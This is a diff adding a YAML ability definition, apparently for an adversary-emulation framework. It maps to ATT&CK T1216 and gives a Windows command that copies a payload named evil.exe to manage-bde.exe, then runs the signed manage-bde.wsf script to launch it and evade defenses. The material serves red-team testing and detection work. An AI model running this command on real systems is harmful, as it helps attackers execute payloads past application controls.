@@ -1,0 +1,24 @@
+- id: beebb9c2-5eb5-6b6e-7a50-643044d677ac
+  name: Manage-bde.wsf - Run the manage-bde.wsf script with a payload named manage-bde.exe
+    in the same directory to run the payload file.
+  description: Run the manage-bde.wsf script with a payload named manage-bde.exe in
+    the same directory to run the payload file.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1216
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd
+          c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
